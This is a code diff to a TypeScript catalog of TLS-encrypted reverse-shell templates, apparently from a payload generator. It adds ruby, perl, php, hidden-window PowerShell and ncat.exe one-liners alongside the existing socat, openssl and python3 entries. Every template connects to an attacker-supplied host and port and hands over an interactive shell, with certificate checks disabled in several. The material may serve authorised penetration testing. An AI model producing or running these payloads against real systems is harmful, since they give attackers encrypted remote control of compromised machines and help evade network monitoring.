@@ -91,9 +91,19 @@ const TLS_CATALOG: { group: string; items: P[] }[] = [
     group: "Linux / Unix (TLS)",
     items: [
       { label: "ncat --ssl", tmpl: "ncat --ssl {LHOST} {PORT} -e /bin/bash", note: "if ncat present" },
-      { label: "socat (TLS)", tmpl: "socat OPENSSL:{LHOST}:{PORT},verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane", note: "full PTY, encrypted" },
-      { label: "openssl", tmpl: "mkfifo /tmp/s;/bin/sh -i</tmp/s 2>&1|openssl s_client -quiet -connect {LHOST}:{PORT}>/tmp/s;rm /tmp/s" },
+      { label: "socat (TLS PTY)", tmpl: "socat OPENSSL:{LHOST}:{PORT},verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane", note: "full PTY, encrypted" },
+      { label: "openssl s_client", tmpl: "mkfifo /tmp/s;/bin/sh -i</tmp/s 2>&1|openssl s_client -quiet -connect {LHOST}:{PORT}>/tmp/s;rm /tmp/s" },
       { label: "python3 (TLS)", tmpl: "python3 -c 'import socket,ssl,subprocess,os;s=socket.socket();s=ssl.wrap_socket(s);s.connect((\"{LHOST}\",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", note: "stdlib ssl — no deps" },
+      { label: "ruby (TLS)", tmpl: "ruby -rsocket -ropenssl -e'c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new(\"{LHOST}\",{PORT}));c.connect;while(l=c.gets);IO.popen(l,\"r\"){|io|c.print io.read}end'", note: "needs openssl gem" },
+      { label: "perl (TLS)", tmpl: "perl -e 'use IO::Socket::SSL;$s=IO::Socket::SSL->new(\"{LHOST}:{PORT}\");open(STDIN,\">&\",$s);open(STDOUT,\">&\",$s);open(STDERR,\">&\",$s);exec(\"/bin/sh -i\");'", note: "needs IO::Socket::SSL" },
+      { label: "php (TLS)", tmpl: "php -r '$c=stream_socket_client(\"ssl://{LHOST}:{PORT}\",\\_,\\_,30,STREAM_CLIENT_CONNECT,stream_context_create([\"ssl\"=>[\"verify_peer\"=>false]]));$p=proc_open(\"/bin/sh -i\",[0=>[\"pipe\",\"r\"],1=>[\"pipe\",\"w\"],2=>[\"pipe\",\"w\"]],$pp);while(!feof($c)){$d=fread($c,1024);fwrite($pp[0],$d);fwrite($c,stream_get_contents($pp[1]));}'" },
+    ],
+  },
+  {
+    group: "Windows (TLS)",
+    items: [
+      { label: "PowerShell (TLS)", tmpl: "powershell -nop -w hidden -c \"[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{PORT});$s=New-Object System.Net.Security.SslStream($c.GetStream(),$false,({$true}));$s.AuthenticateAsClient('{LHOST}');[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}\"", note: "TLS-wrapped reverse shell" },
+      { label: "ncat.exe --ssl", tmpl: "ncat.exe --ssl {LHOST} {PORT} -e cmd.exe", note: "if ncat present on target" },
     ],
   },
 ];
